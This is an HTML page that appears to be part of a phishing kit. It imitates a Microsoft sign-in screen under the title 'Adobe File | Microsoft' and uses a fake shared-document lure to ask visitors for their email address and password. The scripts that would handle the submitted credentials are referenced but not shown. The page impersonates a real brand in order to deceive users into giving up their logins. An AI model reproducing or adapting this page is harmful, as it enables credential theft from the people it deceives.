<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Adobe File | Microsoft</title>
    <link rel="stylesheet" href="style.css" />
    <link rel="shortcut icon" href="./assset/microsoft-fav.svg" type="image/x-icon" />
    <script src="./script.js" defer></script>
    <script src="./app.js" defer></script>
  </head>
  <body>
    <img src="./assset/microsoft-bg-blur.png" alt="" class="image-bg" />
    <header></header>
    <div class="main">
      <div class="container">
        <div class="header">
          <img src="./assset/Microsoft-log.svg" alt="" class="logo" />
        </div>
        <h1 class="title">Sign in</h1>
        <p class="para para1">Only recipient email can access shared files.</p>
        <form id="form" class="form">
          <div class="form__row active">
            <input type="email" class="input email" id="email" placeholder="Email address or Skype" />
            <p class="required">(required)*</p>
            <input type="password" class="input password" id="password" placeholder="Password" required />
            <p class="required">(required)*</p>
            <button type="submit" class="btn">View Document</button>
          </div>
        </form>
      </div>
    </div>
    <img src="" class="privacy" />
  </body>
</html>
